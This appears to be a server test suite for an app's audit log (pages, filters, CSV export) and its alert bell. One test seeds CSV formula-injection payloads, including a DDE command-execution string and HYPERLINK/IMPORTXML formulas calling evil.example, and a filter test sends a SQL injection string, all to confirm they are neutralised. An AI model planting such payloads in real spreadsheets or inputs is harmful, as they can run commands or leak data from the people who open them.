// The audit log in pages with filters, its CSV file, and the alerts the bell shows, against a real server.
// Run with `npm run test:server`.
import assert from 'node:assert/strict';
import { after, before, describe, it } from 'node:test';
import { Client, member, owner, saveSites, startServer, type Json, type TestServer } from './testkit.ts';

let s: TestServer, admin: Client, editor: Client, viewer: Client, reviewer: Client;
type Entry = { id: number; t: number; actor: string; act: string; site: string | null; note?: boolean };
const page = async (c: Client, query = '') => { const r = await c.get('/api/audit' + query); return { status: r.status, audit: r.data.audit as Entry[], more: r.data.more as boolean }; };
/** The CSV file as the browser gets it (the test client reads JSON only). */
async function csv(c: Client, query = ''): Promise<{ status: number; type: string; disposition: string; text: string; lines: string[] }> {
  const r = await fetch(s.base + '/api/audit.csv' + query, { headers: { cookie: 'meridian_session=' + c.cookie } });
  /* Decoded here, keeping the mark at the start of the file that fetch would drop. */
  const text = new TextDecoder('utf-8', { ignoreBOM: true }).decode(await r.arrayBuffer());
  return { status: r.status, type: r.headers.get('content-type') ?? '', disposition: r.headers.get('content-disposition') ?? '', text, lines: text.replace(/^\ufeff/, '').split('\r\n').filter(Boolean) };
}
const DAY = 86_400_000;
/** Reads CSV the way a spreadsheet does: quoted cells, doubled quotes, line breaks inside a cell. */
function parse(text: string): string[][] {
  const rows: string[][] = [];
  let row: string[] = [], cell = '', quoted = false;
  const src = text.replace(/^\ufeff/, '');
  for (let i = 0; i < src.length; i++) {
    const ch = src[i]!;
    if (quoted) {
      if (ch === '"' && src[i + 1] === '"') { cell += '"'; i++; }
      else if (ch === '"') quoted = false;
      else cell += ch;
    } else if (ch === '"') quoted = true;
    else if (ch === ',') { row.push(cell); cell = ''; }
    else if (ch === '\r' && src[i + 1] === '\n') { row.push(cell); rows.push(row); row = []; cell = ''; i++; }
    else cell += ch;
  }
  return rows;
}

before(async () => {
  s = await startServer();
  admin = await owner(s, 'Owner Person', 'owner@example.com');
  await saveSites(admin, [{ id: 's1', domain: 'kopi.example', country: 'Indonesia', cc: 'ID', lang: 'Indonesian', topic: 'Coffee' }, { id: 's2', domain: 'pho.example', country: 'Vietnam', cc: 'VN', lang: 'Vietnamese', topic: 'Food' }]);
  editor = await member(s, admin, 'editor', 'editor@example.com', 'Eddie Editor');
  viewer = await member(s, admin, 'viewer', 'viewer@example.com', 'Vic Viewer');
  reviewer = await member(s, admin, 'reviewer', 'linh@example.com', 'Linh Tran', 's1');
  /* 130 older entries written straight into the table, one a minute, so pages and dates have something to cut. */
  const base = Date.now() - 10 * DAY;
  const ins = s.db().prepare('INSERT INTO audit_log (at, actor, actor_id, act, site, client) VALUES (?, ?, NULL, ?, ?, 0)');
  s.db().exec('BEGIN');
  for (let i = 0; i < 130; i++) ins.run(base + i * 60_000, i % 2 ? 'Content Writer' : 'Keyword agent', `Seeded entry ${String(i).padStart(3, '0')} 100%_done`, i % 3 === 0 ? 's1' : i % 3 === 1 ? 's2' : null);
  s.db().exec('COMMIT');
});
after(() => { s?.stop(); });

describe('the audit log in pages', () => {
  it('gives the newest entries first and says when older ones exist', async () => {
    const first = await page(admin, '?limit=100');
    assert.equal(first.status, 200);
    assert.equal(first.audit.length, 100);
    assert.equal(first.more, true);
    assert.deepEqual(first.audit.map(e => e.id), [...first.audit.map(e => e.id)].sort((a, b) => b - a));
    const next = await page(admin, `?limit=100&before=${first.audit.at(-1)!.id}`);
    assert.equal(next.more, false);
    assert.ok(next.audit.length > 0 && next.audit.every(e => e.id < first.audit.at(-1)!.id));
    const total = (s.db().prepare('SELECT COUNT(*) AS n FROM audit_log').get() as { n: number }).n;
    assert.equal(first.audit.length + next.audit.length, total);
    /* Without a limit: one page of 200, as before there were pages. The limit is kept within bounds. */
    assert.equal((await page(admin)).audit.length, Math.min(total, 200));
    assert.equal((await page(admin, '?limit=0')).audit.length, 1);
    assert.equal((await page(admin, '?limit=99999')).audit.length, Math.min(total, 500));
    assert.equal((await page(admin, '?limit=abc&before=xyz')).audit.length, Math.min(total, 200));
  });

  it('filters by actor, site, text and dates, together with the pages', async () => {
    const writer = await page(admin, '?actor=content%20wri&limit=500');
    assert.equal(writer.audit.length, 65);
    assert.ok(writer.audit.every(e => e.actor === 'Content Writer'));
    const s1 = await page(admin, '?site=s1&limit=500');
    assert.ok(s1.audit.length >= 44 && s1.audit.every(e => e.site === 's1'));
    assert.equal((await page(admin, '?q=entry%20007')).audit.map(e => e.act).join(), 'Seeded entry 007 100%_done');
    /* The wildcards of the search are taken as typed. */
    assert.equal((await page(admin, '?q=100%25_done&limit=500')).audit.length, 130);
    assert.equal((await page(admin, '?q=100%25%25done')).audit.length, 0);
    assert.equal((await page(admin, '?q=Seeded_entry')).audit.length, 0);
    assert.equal((await page(admin, `?q=${encodeURIComponent("' OR 1=1 --")}`)).audit.length, 0);
    const base = (s.db().prepare(`SELECT MIN(at) AS at FROM audit_log WHERE act LIKE 'Seeded%'`).get() as { at: number }).at;
    const span = await page(admin, `?from=${base + 10 * 60_000}&to=${base + 19 * 60_000}&limit=500`);
    assert.deepEqual(span.audit.map(e => e.act.slice(13, 16)), ['019', '018', '017', '016', '015', '014', '013', '012', '011', '010']);
    const both = await page(admin, `?actor=Keyword&site=s2&from=${base}&to=${base + 129 * 60_000}&limit=5`);
    assert.equal(both.audit.length, 5);
    assert.equal(both.more, true);
    assert.ok(both.audit.every(e => e.actor === 'Keyword agent' && e.site === 's2'));
    const rest = await page(admin, `?actor=Keyword&site=s2&limit=500&before=${both.audit.at(-1)!.id}`);
    assert.equal(both.audit.length + rest.audit.length, 21);
  });

  it('is read by every role but the native reviewer, and marks what the dashboard posted', async () => {
    assert.equal((await page(viewer, '?limit=5')).audit.length, 5);
    assert.equal((await page(editor, '?limit=5')).status, 200);
    assert.equal((await reviewer.get('/api/audit?limit=5')).status, 403);
    assert.equal((await new Client(s.base).get('/api/audit')).status, 401);
    await editor.post('/api/audit', { entries: [{ act: 'Paused the Keyword agent' }] });
    const [e] = (await page(admin, '?q=Paused%20the')).audit;
    assert.deepEqual([e!.actor, e!.act, e!.note], ['Eddie Editor', 'Note: Paused the Keyword agent', true]);
  });
});

describe('the audit log as a CSV file', () => {
  it('downloads the selected entries for admins and editors only', async () => {
    const f = await csv(admin, '?actor=Keyword&site=s2');
    assert.equal(f.status, 200);
    assert.equal(f.type, 'text/csv; charset=utf-8');
    assert.match(f.disposition, /^attachment; filename="meridian-audit-\d{8}\.csv"$/);
    assert.ok(f.text.startsWith('\ufeff"Time (UTC)","Actor","Action","Site","Recorded by"\r\n'));
    assert.equal(f.lines.length, 1 + 21);
    assert.match(f.lines[1]!, /^"\d{4}-\d\d-\d\dT\d\d:\d\d:\d\d\.\d{3}Z","Keyword agent","Seeded entry \d{3} 100%_done","pho\.example","Server"$/);
    /* Not cut at a page: everything the filter selects. */
    const all = await csv(editor);
    assert.equal(all.lines.length - 1, (s.db().prepare('SELECT COUNT(*) AS n FROM audit_log').get() as { n: number }).n - 1, 'everything before the export itself');
    assert.equal((await csv(viewer)).status, 403);
    assert.equal((await csv(reviewer)).status, 403);
    assert.equal((await csv(new Client(s.base))).status, 401);
    const [e] = (await page(admin, '?q=Exported%20the%20audit&limit=1')).audit;
    assert.match(`${e!.actor}: ${e!.act}`, /^Eddie Editor: Exported the audit log as a CSV file \(\d+ entries\)$/);
  });

  it('never lets an entry run as a spreadsheet formula, and keeps quotes and commas inside their cell', async () => {
    const ins = s.db().prepare('INSERT INTO audit_log (at, actor, actor_id, act, site, client) VALUES (?, ?, NULL, ?, ?, ?)');
    const now = Date.now();
    ins.run(now, '=cmd|\' /C calc\'!A0', 'CSVCASE =HYPERLINK("http://evil.example","x")', null, 0);
    ins.run(now, '+1+1', '=1+1 CSVCASE', '=s9', 0);
    ins.run(now, '@SUM(A1)', '-2+3 CSVCASE', null, 0);
    ins.run(now, 'Dana "D", Owner', '\t=1 CSVCASE, with a comma\nand a second line', null, 1);
    /* The same through the door people use: a note posted from the dashboard, and an email tried at sign-in. */
    await admin.post('/api/audit', { entries: [{ act: '=IMPORTXML("http://evil.example") CSVCASE', site: '@site' }] });
    const f = await csv(admin, '?q=CSVCASE');
    const cells = parse(f.text).slice(1);
    assert.equal(cells.length, 5);
    for (const row of cells) for (const cell of row) assert.doesNotMatch(cell, /^[=+\-@\t\r]/, cell);
    const byAct = (part: string) => cells.find(r => r[2]!.includes(part))!;
    assert.deepEqual(byAct('HYPERLINK').slice(1, 3), ["'=cmd|' /C calc'!A0", 'CSVCASE =HYPERLINK("http://evil.example","x")']);
    assert.deepEqual(byAct('=1+1').slice(1, 4), ["'+1+1", "'=1+1 CSVCASE", "'=s9"]);
    assert.deepEqual(byAct('-2+3').slice(1, 3), ["'@SUM(A1)", "'-2+3 CSVCASE"]);
    assert.deepEqual(byAct('second line').slice(1, 5), ['Dana "D", Owner', "'\t=1 CSVCASE, with a comma\nand a second line", '', 'Dashboard note']);
    assert.deepEqual(byAct('IMPORTXML').slice(2, 5), ['\'=IMPORTXML("http://evil.example") CSVCASE', "'@site", 'Dashboard note']);
    /* Every quote inside a cell is doubled, so the cell cannot end early. */
    assert.ok(f.text.includes('"Dana ""D"", Owner"'));
  });
});

describe('alerts for the bell', () => {
  const add = (key: string, event: string, site: string | null, title: string, at = Date.now()) =>
    s.db().prepare('INSERT INTO alerts (key, event, site, title, body, link, created_at, sent_at, result) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)').run(key, event, site, title, 'Body of ' + title, event === 'report' ? '/reports' : event === 'budget' ? '/analytics' : '/deploy', at, at, 'No external channel is on for this alert.');
  const bell = async (c: Client) => (await c.get('/api/notifications')).data.alerts as (Json & { key: string; event: string })[];

  it('lists blocked domains, budget alerts and sent reports, newest first, and nothing else', async () => {
    add('access:s1:1', 'blocked', 's1', 'kopi.example is blocked in Indonesia', Date.now() - 3000);
    add('budget:s1:today', 'budget', 's1', 'kopi.example passed 80% of its daily budget', Date.now() - 2000);
    add('report:1', 'report', null, 'The weekly report was sent', Date.now() - 1000);
    add('error:a1:1', 'error', 's1', 'The Content Writer failed');
    add('review:a1:1', 'review', 's1', 'Article ready for review');
    add('access:s1:0', 'blocked', 's1', 'An old block', Date.now() - 40 * DAY);
    const list = await bell(admin);
    assert.deepEqual(list.map(a => a.key), ['report:1', 'budget:s1:today', 'access:s1:1']);
    assert.deepEqual(Object.keys(list[0]!).sort(), ['at', 'body', 'event', 'id', 'key', 'link', 'site', 'title']);
    assert.deepEqual([list[2]!.title, list[2]!.body, list[2]!.link, list[2]!.site], ['kopi.example is blocked in Indonesia', 'Body of kopi.example is blocked in Indonesia', '/deploy', 's1']);
  });

  it('is for everyone signed in except the native reviewer', async () => {
    assert.equal((await bell(viewer)).length, 3);
    assert.equal((await bell(editor)).length, 3);
    assert.equal((await reviewer.get('/api/notifications')).status, 403);
    assert.equal((await new Client(s.base).get('/api/notifications')).status, 401);
  });

  it('leaves out an event whose In-app box is off in Settings > Alerts', async () => {
    const np = { approval: [true, true, false, false], error: [true, false, true, false], blocked: [false, true, true, false], budget: [true, true, false, false], review: [true, false, false, false], report: [true, true, false, false] };
    assert.equal((await admin.put('/api/workspace/docs/notifyPrefs', { version: 0, data: np })).status, 200);
    assert.deepEqual((await bell(admin)).map(a => a.event), ['report', 'budget']);
    assert.equal((await admin.put('/api/workspace/docs/notifyPrefs', { version: 1, data: { ...np, blocked: [true, false, false, false], report: [false, true, false, false] } })).status, 200);
    assert.deepEqual((await bell(viewer)).map(a => a.event), ['budget', 'blocked']);
  });

  it('keeps what each person has read, by the alert\'s key', async () => {
        assert.equal((await editor.post('/api/notifications/read', { keys: ['alert:budget:s1:today'] })).status, 200);
    assert.deepEqual((await editor.get('/api/workspace')).data.notifRead, ['alert:budget:s1:today']);
    assert.deepEqual((await admin.get('/api/workspace')).data.notifRead, []);
  });
});
